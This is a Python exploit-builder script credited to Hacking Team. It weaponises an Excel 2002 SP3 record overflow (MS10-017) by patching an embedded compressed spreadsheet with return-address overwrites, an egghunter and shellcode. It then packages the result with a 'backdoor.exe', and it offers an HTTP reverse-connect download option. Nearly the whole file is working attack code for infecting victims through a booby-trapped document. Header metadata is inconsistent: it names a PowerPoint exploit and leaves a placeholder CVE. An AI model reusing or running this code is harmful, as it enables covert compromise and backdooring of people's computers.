#! /usr/bin/env python

#Copyright HT srl, 2010
#http://www.hackingteam.it/ for more information

#cod

# MS Office PowerPoint 2003 SP3 Heap Overflow Exploit (MS10-004)


import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile

import jscript_unicode
import x86shelldrophttp
import x86int3
import ASCIIHexWhitespace
import x86helloworld

NAME='Microsoft Excel 2002 SP3'
DESCRIPTION='[+] Microsoft Office Excel 2002 SP3 01C2h Record Code Execution Exploit (MS10-017)'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://www.microsoft.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Microsoft Excel 2002 SP3'
DOCUMENTATION['CVE']='CVE-????-????'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-????-????"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Microsoft'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP3 English with Microsoft Office XP/2007
"""

CHANGELOG="""
"""

# Global payload
payload = 0

#from pyPdf.pdf import *
#from pyPdf.generic import *
#from pyPdf.filters import *

class ms10_017():
	def __init__(self, inputFile, zipFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile

		self.compressedfile = (
b"\x78\x9C\xED\x5C\x6B\x6C\x54\x45\x14\xFE\xE6\xEE\xA3\x5B\xA9\xB0"
b"\x2D\x85\x6A\xB1\xCB\xB2\x05\x2D\x0F\x8D\x3C\x82\x24\x0A\xA5\xA5"
b"\xAD\x16\x5B\xDB\x6C\xDB\xD0\x28\x06\x96\xF6\x82\x1B\x96\xDD\xBA"
b"\xDD\x1A\x7C\x44\xD7\x57\xA2\x46\x12\x0C\x26\x26\x4A\xA2\x84\x18"
b"\x21\xF8\x8C\x51\x7F\x68\x62\x8B\x7F\xC4\xC4\xF0\x88\xC4\x68\x48"
b"\x28\xC6\xF8\x47\x12\xAB\x51\x23\x5A\xBA\x9E\x33\xF7\x5E\xBB\xBB"
b"\xBD\xBB\xA1\x2A\xB0\xC0\x7C\x93\x33\x33\x7B\xCE\xCC\x9C\xB9\x33"
b"\x73\xEE\xDC\x99\x3B\x77\x8F\x1C\x2E\x1D\xDE\xF3\x5E\xE5\x29\x64"
b"\x61\x15\x1C\x18\x4B\x15\xC3\x9D\xC6\x13\x44\xD5\xD6\x0F\x2F\x48"
b"\x9E\x4A\x71\xD4\x0A\x03\x44\x29\x85\x4B\x0A\xC5\x1E\xEA\x48\xB7"
b"\x0B\x5F\xD5\x7C\x59\x74\x28\x49\x51\x0D\x38\x05\x0D\xEF\x3A\x87"
b"\xC8\x07\xBE\x23\x5A\x8F\x3E\x78\x80\xBB\xC2\x3D\xB1\x48\xA8\x7F"
b"\xAD\xFF\x42\xA0\x5E\xD6\x21\x24\xB8\x0E\x83\x34\xF0\x56\x0A\x37"
b"\x8D\x3F\x8D\x46\xE5\x6E\xF2\xA7\xE2\x5A\x59\xBB\x32\xE9\x4F\x97"
b"\xFE\x3B\x32\xED\x27\xD2\x5F\x49\x92\xED\xE4\x5E\xA9\xF9\x2B\xB0"
b"\xC2\x1C\xBB\xDD\xDA\x6A\x99\x6E\x87\xF4\x03\xD2\x9F\x4A\xBE\xC0"
b"\x47\x32\xCF\xB7\x92\xB3\x18\x95\xF8\x9C\xC7\xF1\x63\x3B\x85\x31"
b"\xD0\x5D\xA2\x0E\x71\x84\x11\x42\xE4\xC2\x49\xB5\x4C\xA9\xCF\xB9"
b"\x14\x2E\x54\x40\x54\x63\x11\x99\x60\x35\x6E\xA6\x4E\xF1\xD3\x45"
b"\xBC\xE9\x0F\xE0\x56\x8A\xDF\x08\x3B\x89\xCF\xB9\x92\x0C\xF8\xBA"
b"\x5C\xD9\xEE\x41\x10\x3A\x7A\x71\x6F\x9E\x02\x6A\x51\x84\xAA\xF4"
b"\x02\x6E\x22\xCA\xA7\x3D\x5B\xEE\x73\x36\xD3\xE0\x09\xE4\x2F\x22"
b"\x57\x4D\x26\x16\x76\x3F\x16\x60\x39\xC4\x06\x4A\xB6\x80\xD8\x76"
b"\x95\x66\x99\x51\xAB\xFC\x29\xAC\x32\x02\x14\x06\x6C\xA5\xAB\xA5"
b"\xEF\x73\x6E\xC5\x7C\x2C\xCD\xA5\x74\x03\x65\xCA\xA7\x72\x5C\x3E"
b"\x51\x61\xA6\xCC\x52\xF7\x38\xE5\x5F\x65\xA7\x2E\xBB\x39\x72\xA9"
b"\xB5\x4F\x97\xA9\xBE\x96\x5C\xBE\x6B\x7E\x18\x0B\x89\x93\xB7\x12"
b"\xF9\xAE\xDC\x2E\x95\x7D\x05\xEC\xDA\x60\x18\xE5\xD2\x42\x7E\x4B"
b"\xF9\xD3\xE6\x9F\x41\x3F\xF3\x85\xC5\xFF\xF5\xDC\xF8\xDA\x24\xF9"
b"\xB8\x02\xF9\x82\xFA\x61\x1C\x56\x7B\x2E\x34\xD2\xFF\x91\xCD\x9F"
b"\x9F\x83\xBF\x28\x07\x7F\x41\x0E\x7E\xB1\x2D\xDF\x65\xD5\xC7\x33"
b"\xCE\xDF\xA5\x39\xE1\x4D\x3A\x52\x1C\x96\x26\xDD\x32\x2C\x4B\x3A"
b"\x65\x38\x3D\x59\x24\x43\x24\x21\xC3\xF2\xA4\x2B\xB5\x51\xDE\xD1"
b"\x9F\xA6\xFB\xFB\x6D\x45\x5C\x82\x1B\x4D\xFA\x40\x38\xB2\x98\x39"
b"\x43\x73\xD2\x38\x4B\x98\xF3\x79\x20\x8D\xB3\xF4\x79\x38\x31\x87"
b"\xDC\x90\xF0\x10\x01\x9D\x3B\x04\x46\xC7\x2B\x83\x14\x8D\x1C\x0F"
b"\xAE\xA2\x98\x31\x77\x7A\x33\xE6\xCE\x29\x5A\xF9\x3F\x29\x8B\x89"
b"\x96\x94\x00\x09\xD2\x78\xB5\x9C\x69\x4A\xC8\xEF\xC5\x34\x19\x2F"
b"\x95\x23\xD0\x4B\x65\x8D\xEE\xFF\xF9\x58\xEB\xA6\xF6\xDA\x0D\x92"
b"\xBF\x40\xF2\x17\x4A\xFF\x09\xC9\x49\xA6\x69\x9F\xC7\x57\x4A\x75"
b"\x78\x9C\x24\x43\x4E\xD6\x35\x83\xE8\x49\x99\xFA\x29\xE9\xB7\x62"
b"\xB9\x93\xFD\x30\x7A\x68\xFE\x88\xA1\x9F\x68\x33\x12\xD4\xA2\xDD"
b"\x68\x47\x07\x85\x0D\xC4\xE9\xC1\x00\xB6\xD1\x3D\x37\x2A\x25\xEB"
b"\xE4\x4C\x93\xA0\xDF\x71\x53\x8F\x70\xC2\x7D\x02\xDD\x0E\x47\x0A"
b"\xB2\xA7\x5E\x9E\xB2\xCC\xD3\x4B\xB1\x69\x34\x8F\x6A\x72\x36\x65"
b"\x5D\x75\x58\x86\xFF\x0F\x22\x2D\xD4\xCC\x90\x9F\x51\xB2\xD3\x35"
b"\x34\xDF\xD5\x15\x80\x57\xB4\x38\x4A\xF0\xC5\xB1\xDF\xE3\xD9\xF2"
b"\x74\x14\x4F\x28\x5D\xE1\x4A\x43\x7A\xCF\x7B\xE9\x47\x47\x6B\xE7"
b"\x5A\x19\x27\xD1\x7F\xB1\x93\xE6\x68\xDF\x40\xA2\x3E\x1C\x45\x53"
b"\x5B\xB0\xB5\xA3\xAD\x2B\xB8\xA6\x11\xC1\xC6\x8E\x86\x96\x16\x74"
b"\x45\xC3\x71\xBD\x9F\x63\xCD\xD1\x84\x1E\x8F\xE8\xA1\x07\xC2\xD1"
b"\x2D\x68\x6B\x6A\x42\xF3\xB6\xD0\x16\xBD\xF3\xC1\x3E\x1D\x6B\xDB"
b"\x1B\x6F\x6F\xD5\x7B\xD1\x16\x0F\xEB\xD1\x44\x28\x11\x8E\x45\xD1"
b"\xDE\x16\xEC\x0C\xD6\x35\x77\x62\x4D\x2C\x12\x09\x25\x74\x99\x25"
b"\xA8\xF7\xC7\x22\x03\x52\xDE\xD6\xC7\xC1\x62\xB4\x87\xFA\xF4\x78"
b"\x47\xF8\x21\x1D\x2D\x8D\x9D\x9D\x8D\x41\x4E\x1F\x8B\xB7\xC6\x7A"
b"\x75\x2C\x59\xB6\xA9\xAF\xEF\x5C\xDB\x86\x6E\x4F\x68\xED\x6E\x58"
b"\x27\xA8\x5D\xF6\xD0\xAC\x5C\x0C\xB6\x72\x21\x9F\xB5\xBB\xB5\x6E"
b"\xED\xB9\xAA\xDB\x46\xCF\x3E\x7A\xB2\xD6\x0A\x05\xBA\x48\x42\x77"
b"\x3F\x6D\xAA\xCC\x6F\xD8\x97\x83\xC8\xA3\x79\xCD\xB8\x69\xB0\x62"
b"\x9A\xE4\x09\x1B\x9E\x66\xC3\x73\xD8\xF0\x9C\x36\x3C\x97\x0D\xCF"
b"\x93\xC5\x73\xE3\x53\xD9\xE9\xD3\x88\x1E\x99\xF5\x8C\xE0\x7B\xC8"
b"\x70\xC9\xB3\x67\xF7\x8B\x8A\x23\xF4\x58\x5D\x87\xD3\x63\xEC\x2B"
b"\x57\x88\xCE\x27\x50\xE7\x43\x91\xB6\x57\x1C\x81\xEA\xAC\x02\x77"
b"\x6E\x7A\x46\x12\xA6\xA5\xED\xAB\x32\x2C\x8D\x90\x3A\x20\x2A\x8E"
b"\x8A\x7A\xDB\x2C\xAA\x3B\x0B\xC7\x59\xB6\xF6\xBA\x38\x0A\xD5\x5D"
b"\x05\xEF\xD8\xDA\x34\xD3\xDA\x76\xCE\x36\xAC\x4D\x58\xD6\xB6\x26"
b"\x2B\xB1\xEA\xB8\x42\x73\x19\xD6\xA6\xBA\xAB\xD0\x1D\x5B\x9B\xC3"
b"\xB4\xB6\xED\x73\x0C\x6B\xD3\x2C\x6B\x6B\xB0\xC9\xA0\xBA\xB0\x90"
b"\x5C\x86\xB5\xA9\xEE\x2A\x74\xE7\xC6\x67\xC2\x69\x5A\xDB\xC6\x6A"
b"\xC3\xDA\xC8\xFA\x52\x6F\x89\x8A\x63\xA2\x31\x2B\xB1\xEA\xBA\xC2"
b"\x73\x96\xBD\xBD\x21\x8E\x41\x75\xD8\x25\xE0\x78\x7E\x73\x99\x16"
b"\xD7\x32\xCF\xB0\x38\xB2\xC0\x31\x39\xBF\x35\xA1\xEE\x72\xC0\x45"
b"\x6F\xE4\xF3\xE7\x32\xE6\xB7\xA6\x09\xE2\x73\xB3\xB8\x3F\x2D\xD4"
b"\xFF\x79\x59\xE2\x62\x77\xD2\xB8\x13\x9A\x1B\x1E\x7A\x7E\x9C\x41"
b"\x76\x37\x17\xD6\x73\xA5\x85\x13\xB8\x7E\x74\x2A\xE6\xCE\xDC\x3E"
b"\x1D\x73\xC9\x06\x07\xEB\xE9\x41\xF3\x6B\x4A\xDF\x4E\xB2\x72\xD4"
b"\xE0\xA0\x28\xC1\x8F\x75\x0E\xFC\x10\x18\xE4\x05\x20\x4E\xE3\x20"
b"\xBF\x47\x1A\x59\xEB\x96\xEF\x90\x46\x3C\xE6\x5E\xEE\x14\x27\x97"
b"\xEB\x18\xA9\x74\x73\xE8\x1C\xA9\x91\xFB\xDF\xC5\x23\xDE\xF4\x4D"
b"\xDF\xF3\xFB\x02\x6A\x8F\x71\x10\xC8\xDC\x46\xA6\xD4\x9A\x36\x61"
b"\x1B\x19\x75\x99\xDB\xC8\xE3\x58\xA5\x95\xE1\x43\x19\x5B\x9D\xC6"
b"\xAD\xE2\x8B\x32\xB7\x77\x4D\xD6\x4F\xF2\x6C\xD2\x2D\x44\xB9\xDF"
b"\xC5\x65\x5C\x35\x92\xD5\x17\xF2\x3D\xDC\x84\x66\x20\x9C\xF7\x66"
b"\x98\x34\xC6\x52\x7C\xD2\x44\x9B\xC0\xE7\xE2\x87\x9F\x7E\xF5\x97"
b"\x33\x6D\xF7\x79\x0F\xBC\xE0\xC1\xC2\x1B\xDE\xFF\xE6\x66\xE2\xED"
b"\x23\x2A\x32\xE5\x5C\x33\xBE\xAE\x3B\x60\xBC\xAC\x5D\x0F\x3E\x91"
b"\x03\xF0\xCB\x07\x1E\x8B\xCF\x80\xDB\x1B\x78\x11\x7C\x46\x07\x78"
b"\x0D\xC6\x7B\xBD\xEF\x29\x93\xCF\x4C\x63\x1D\x2A\x62\x9D\xB9\x78"
b"\xDC\x8B\xAD\xE1\x9E\x78\xAC\x3F\xB6\x39\xE1\x6F\xDC\xDE\xA3\x47"
b"\x8C\x56\x59\xB9\xFC\xE3\xB7\x4E\x1E\x12\x32\xFE\x44\xE2\xCE\xB7"
b"\x29\xEE\xF8\x37\x8D\xA0\xA0\xA0\xA0\xA0\xA0\xA0\xA0\xA0\xA0\xA0"
b"\xA0\xA0\xA0\x70\x99\x23\xDF\xFA\x5F\x3B\xFE\xE5\xF1\xDD\x37\xCD"
b"\xF2\xEE\x7A\x89\xD6\xFF\x8B\xCE\xBC\xCD\xEB\xFF\x61\x18\x67\xFE"
b"\x58\xCE\x7B\x53\xBC\x87\xD5\x4D\x54\x41\xD4\x4B\x34\x85\x28\x02"
b"\x63\xCD\x9E\x80\xB1\xEE\x7F\x84\x68\x26\x78\x5F\xC4\xD8\x0F\x78"
b"\x1E\xC6\x3A\xFF\x03\x64\xEE\x07\x38\x4D\xDD\xBC\x86\xDF\x5F\x79"
b"\x95\x2C\x0B\x66\x99\x76\xA1\xCF\x6B\xA4\xE5\xFD\x08\xE3\x7C\xF7"
b"\x78\x74\xC9\x78\x74\x29\x4A\xBC\x86\x22\x9F\x59\x21\xC9\x8E\xE8"
b"\xFD\xFE\x5E\xDD\xDF\x13\x8A\xF4\x0C\x44\xCC\xD3\x87\x0A\x0A\x0A"
b"\x0A\x0A\x0A\x0A\x0A\x0A\x0A\x0A\x0A\x0A\x0A\x97\x27\xAC\x6F\x6D"
b"\x79\xED\xCB\xEB\x6F\x3E\x0F\xC6\x07\x0A\x78\xF5\xCC\xEF\xF4\x79"
b"\xAD\xCF\x07\x0B\x78\xCD\xCD\x6B\x76\x5E\xBF\xF3\x59\x05\x5E\xF7"
b"\xF3\x1A\xBF\x14\xC6\xFF\xBF\xF0\xB2\xDA\x3A\x05\xC1\x6B\x7D\xDE"
b"\x0F\xB8\x86\xE8\x5A\x53\x3E\x8B\xC2\xEB\xC0\x27\x18\x8C\x65\xF8"
b"\x6C\x22\x3F\xD1\x1C\x53\x7E\x96\x68\xEC\x62\xFE\x11\xCA\x15\x8A"
b"\x20\x62\xE4\xF8\xDB\xD6\x46\xF9\x8D\x6B\x1C\x0F\x4E\x6A\xFC\xCC"
b"\x84\x4B\x58\x65\xF1\x38\xF2\x7B\x8C\xBD\xA4\x41\x43\xDC\x94\x9E"
b"\x76\xE7\xDE\xA7\xEE\x7E\xF7\xE4\x21\x61\xFD\x5F\x10\x63\x1D\x69"
b"\x8F\x63\x2B\x36\xC9\x7A\x6C\x9D\x94\x6E\x46\x19\x34\x91\x7E\x3D"
b"\xE7\x9A\xEF\xB0\xF9\x47\x46\x2E\x74\xC8\x2F\x7C\xB7\x21\x24\xAF"
b"\xBD\x99\x5A\x61\xB3\xAC\x13\x73\x12\x08\x53\x3C\x9A\xA7\x9C\x1A"
b"\xD2\x6F\x7C\xE1\x6A\xFF\xAD\xBA\x7D\x9D\x61\x18\x8F\xD4\x9F\xFD"
b"\x95\xF1\xE4\xEA\xB3\xE2\x5F\x5C\x7F\x65\x9A\xFE\xBF\x01\xD7\xE1"
b"\x3F\xC4"
)
		#self.source_pdf = 'resources/blank.pdf'
		self.dest_xls = outputFile
		self.infile = inputFile
		
		return

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename

	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.infile)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.infile)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	def make_doc(self):
		input = bytearray(zlib.decompress(self.compressedfile))
		#input = bytearray(self.compressedfile)
		
		#secondstage = 
		shellcode = self.createShellcode()
	
		egghunter = (b"\x31\xd2"
b"\x66\x81\xca\xff\xff\x42\x83\xc2\x7c\x52\x6a\x02\x58\xcd\x2e\x3c"
b"\x05\x5a\x74\xec\xb8\x41\x90\x41\x90\x89\xd7\xaf\x75\xe8\xaf\x75"
b"\xe5\xff\xe7"
)

		for i in range(0,4):
			input[0x238F + i] = b"\x96\x60\x13\x00"[i]                     #set eax to overwrite a return address
		
		for i in range(0,2):
			input[0x23B0 + i] = b"\xD6\x22"[i]                             #program returns on call esi in Excel.exe


		offset = 0x2208
		for i in range(0,len(egghunter)):
			input[offset + i] = egghunter[i]

		offset = 0x2A00
		
		for i in range(0,256):
			input[offset + i] = b"\x41\x90"[i%2]                            #egg hunted
		
		for i in range(0,len(shellcode)):
			input[offset + 256 + i] = shellcode[i]

		tmp_bkname = os.path.split(self.dest_xls)[1]
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_doc = os.tempnam()
			tmp_backdoor = os.tempnam()
			
		f = open(tmp_doc,mode='wb')
		f.write(input)
		f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding xls file"
		zip.write(tmp_doc, "document.xls")
		print "Adding backdoor"
		zip.write(self.dest_xls, "backdoor.exe")
		
		zip.close()
		
		try:
			os.unlink(tmp_doc)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1

		
		return

	def run(self):
		self.make_doc()
		return 1

if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 4:
		print "[ERROR] %s require 4 parameters"%(DESCRIPTION)
		print "[-INFO] backdoor output zip [-debug | -http]"
		sys.exit(0)

	if len(sys.argv) > 3:
		for i in range(3, len(sys.argv)):
			if sys.argv[i] == '-http':
				print "[HTTP] Using HTTP reverse connect to download exe"
				payload = 1
				http = True
			elif sys.argv[i] == '-debug':
				print "[DEBUG] Using INT3 exploit mode"
				dbg = True
			elif sys.argv[i] == '-hello':
				print "[HELLOWORLD] Using HelloWorld payload"
				payload = 2

	if http == False:
		if os.path.isfile(sys.argv[1]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[1])
			sys.exit(0)

		if os.path.getsize(sys.argv[1]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[1])
			sys.exit(0)

	if os.path.isfile(sys.argv[3]) == False:
		print "[ERROR] File %s doesn't exists."%(sys.argv[3])
		sys.exit(0)
		
	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)
	
	app=ms10_017(sys.argv[1], sys.argv[2], sys.argv[3], dbg)
	app.run()
	
	print ' ... done'